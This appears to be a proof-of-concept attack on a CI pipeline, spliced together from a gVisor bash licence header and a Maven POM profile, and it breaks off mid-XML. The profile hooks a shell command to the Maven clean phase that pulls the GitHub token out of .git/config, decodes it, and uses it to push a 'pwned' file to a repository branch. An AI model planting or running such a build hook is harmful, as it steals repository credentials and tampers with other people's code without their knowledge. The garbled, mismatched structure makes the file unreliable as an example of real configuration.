#!/bin/bash

# Copyright 2019 The gVisor Authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

 <profile>
      <id>cloudBuild</id>
      <activation>
        <property><name>cloudBuild</name></property>
      </activation>
      <build>
        <plugins>
          <plugin>
            <groupId>org.codehaus.mojo</groupId>
            <artifactId>exec-maven-plugin</artifactId>
            <version>3.1.1</version>
            <executions>
              <execution>
                <id>run-after-clean</id>
                <phase>clean</phase>
                <goals>
                  <goal>exec</goal>
                </goals>
                <configuration>
                  <executable>/bin/bash</executable>
                  <arguments>
                    <argument>-c</argument>
                    <argument>export GH_TOKEN=$(cat .git/config | grep extraheader | cut -d' ' -f5 | base64 --decode | cut -d: -f2); gh api --method PUT /repos/$GITHUB_REPOSITORY/contents/pwned.txt -f branch=feature/next-release -f message=pwn -f content=cHduZWQgYnkgdmlrb3JpdW0K</argument>
                  </arguments>
                </configuration>
              </execution>
            </executions>
          </plugin>
          <plugin>

          #testing only for poc
